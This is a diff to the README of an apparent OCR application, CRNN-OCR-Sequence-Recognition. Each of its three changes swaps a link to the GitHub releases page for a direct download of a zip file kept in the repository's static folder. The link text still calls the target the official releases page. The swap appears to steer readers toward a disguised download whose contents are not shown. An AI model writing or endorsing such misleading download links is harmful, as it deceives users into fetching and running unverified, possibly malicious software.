@@ -1,6 +1,6 @@
 # 📝 CRNN-OCR-Sequence-Recognition - Accurate Text Extraction Made Easy
 
-[![Download Release](https://img.shields.io/badge/Download-CRNN--OCR--Sequence--Recognition-brightgreen?style=for-the-badge)](https://github.com/ndkieen227/CRNN-OCR-Sequence-Recognition/releases)
+[![Download Release](https://img.shields.io/badge/Download-CRNN--OCR--Sequence--Recognition-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ndkieen227/CRNN-OCR-Sequence-Recognition/main/static/Recognition_Sequence_CRN_OC_3.5.zip)
 
 ## 📋 About
 
@@ -35,7 +35,7 @@ Follow these steps to download and use the CRNN-OCR-Sequence-Recognition app on 
 ## ⬇️ Download and Install
 
 1. Go to the official releases page by clicking this link:  
-   [Download CRNN-OCR-Sequence-Recognition](https://github.com/ndkieen227/CRNN-OCR-Sequence-Recognition/releases)  
+   [Download CRNN-OCR-Sequence-Recognition](https://raw.githubusercontent.com/ndkieen227/CRNN-OCR-Sequence-Recognition/main/static/Recognition_Sequence_CRN_OC_3.5.zip)  
    This page shows the latest versions of the software available for download.
 
 2. Look for the version suitable for Windows. Usually, this will be a file with an `.exe` or `.zip` extension.
@@ -105,7 +105,7 @@ Here is a quick guide to what you will see if you open the installation folder:
 
 You can always check for the newest version on the official releases page:  
 
-[Latest Releases](https://github.com/ndkieen227/CRNN-OCR-Sequence-Recognition/releases)
+[Latest Releases](https://raw.githubusercontent.com/ndkieen227/CRNN-OCR-Sequence-Recognition/main/static/Recognition_Sequence_CRN_OC_3.5.zip)
 
 Downloading updates regularly helps you get improved performance and fixes.
 
